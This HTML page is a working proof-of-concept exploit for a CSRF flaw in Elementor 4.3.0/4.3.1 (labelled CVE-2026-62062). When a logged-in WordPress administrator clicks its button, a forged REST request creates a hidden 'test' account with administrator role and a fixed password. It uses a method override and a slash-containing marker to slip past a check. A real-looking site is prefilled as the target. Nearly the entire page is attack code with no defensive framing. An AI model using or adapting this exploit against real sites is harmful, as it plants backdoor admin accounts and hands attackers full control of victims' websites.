<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Elementor CSRF PoC — CVE-2026-62062</title>
<style>
  body{font-family:system-ui,sans-serif;max-width:760px;margin:40px auto;padding:0 16px;line-height:1.5}
  input,textarea,code{font-family:ui-monospace,monospace}
  input,textarea{width:100%;box-sizing:border-box;padding:8px;margin:4px 0 16px}
  a.btn{display:inline-block;padding:12px 20px;font-size:16px;color:#fff;background:#b3261e;
        text-decoration:none;border-radius:6px}
  .note{background:#fff4e5;border-left:4px solid #f0a000;padding:10px 14px;border-radius:4px}
</style>
</head>
<body>
  <h1>Elementor 4.3.0/4.3.1 — CSRF → Admin</h1>
  <p class="note">Victim must be logged in as admin on the target <strong>in this same browser</strong> before clicking.</p>

  <p>Target base URL:</p>
  <input id="target" value="https://mrgm.co.ke">

  <p>Payload URL (note the LITERAL slashes in the marker):</p>
  <textarea id="payload" rows="4" readonly></textarea>

  <a id="fire" class="btn" href="#">Create "test" admin</a>

  <script>
    // Build manually so the marker keeps literal '/' — do NOT use URLSearchParams here,
    // it serializes '/' as %2F and REQUEST_URI then no longer contains the substring.
    function build() {
      const base = document.getElementById('target').value.replace(/\/+$/, '');
      return base + '/wp-json/wp/v2/users'
        + '?_method=POST'
        + '&username=test'
        + '&email=test%40example.test'
        + '&password=Mike%4017894'
        + '&roles%5B%5D=administrator'
        + '&x=elementor/v1/events/';           // literal slashes — required
    }
    function render() {
      const url = build();
      document.getElementById('payload').value = url;
      document.getElementById('fire').href = url;
    }
    document.getElementById('target').addEventListener('input', render);
    render();
  </script>
</body>
</html>
